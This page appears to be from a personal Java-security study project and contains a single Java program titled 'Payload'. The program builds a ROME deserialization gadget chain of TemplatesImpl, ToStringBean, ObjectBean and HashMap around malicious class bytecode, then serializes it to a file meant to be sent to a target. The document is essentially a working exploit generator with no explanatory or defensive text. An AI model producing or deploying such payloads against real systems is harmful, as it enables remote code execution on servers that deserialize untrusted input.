# Payload
```java
package xyz.fe1w0.java.basic.serialize.rome.demo;

/**
 * @author fe1w0
 * @date 2025/2/4 01:11
 * @Project ownJavaSec
 */
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;

import static xyz.fe1w0.java.basic.classloader.xalan.Demo.CLASS_BYTES;

public class RomePayload {
    public static void main(String[] args) throws Exception {
        // 1. 构造恶意字节码
        byte[] maliciousBytecode = CLASS_BYTES; // 恶意类的字节码

        // 2. 构造 TemplatesImpl 对象
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][] {maliciousBytecode});
        setFieldValue(templates, "_name", "Pwned");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 3. 构造 ToStringBean
        ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class, templates);

        // 4. 构造 ObjectBean
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);

        // 5. 构造 HashMap
        HashMap hashMap = new HashMap();
        hashMap.put(objectBean, "value");

        // 6. 序列化 Payload
        byte[] payload = serialize(hashMap);

        // 7. 将 Payload 写入文件或发送到目标
        writeToFile(payload, "payload.bin");
    }

    // 反射设置字段的工具方法
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    // 序列化工具方法
    private static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        return baos.toByteArray();
    }

    // 写入文件工具方法
    private static void writeToFile(byte[] data, String filename) throws Exception {
        FileOutputStream fos = new FileOutputStream(filename);
        fos.write(data);
        fos.close();
    }
}
```